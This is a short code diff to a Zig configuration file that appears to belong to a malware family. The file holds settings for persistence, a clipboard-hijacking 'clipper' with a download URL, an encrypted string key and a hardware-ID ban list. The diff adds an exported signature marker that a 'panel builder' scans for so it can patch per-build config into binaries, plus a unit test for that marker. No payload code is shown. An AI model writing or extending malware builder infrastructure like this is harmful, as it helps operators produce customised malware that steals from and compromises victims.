@@ -1,3 +1,5 @@
+const std = @import("std");
+
 pub const SEED: u32 = 0x61472f96;
 pub const STRING_KEY_ENC: [16]u8 = .{ 0xbf, 0xcd, 0x2f, 0x77, 0xdf, 0xd9, 0xb9, 0xf9, 0x58, 0xf7, 0x0b, 0xa4, 0x49, 0xab, 0xad, 0x3b };
 pub const ENABLE_PERSISTENCE: bool = false;
@@ -26,3 +28,12 @@ pub const ENABLE_CLIPPER: bool = false;
 pub const CLIPPER_DOWNLOAD_URL: [128]u8 = .{0} ** 128;
 
 pub const HWID_BAN_LIST: []const []const u8 = &.{};
+
+// Builder config marker — exported so linker keeps it in .rdata
+// Panel builder scans for this signature to locate config data
+pub export var MIRAGECFG_MARKER: [17]u8 = .{ 'M', 'I', 'R', 'A', 'G', 'E', 'C', 'F', 'G', ':', 'P', 'A', 'T', 'C', 'H', ':', ' ' };
+
+test "MIRAGECFG marker present" {
+    try std.testing.expect(MIRAGECFG_MARKER[0] == 'M');
+    try std.testing.expect(MIRAGECFG_MARKER[8] == 'G');
+}
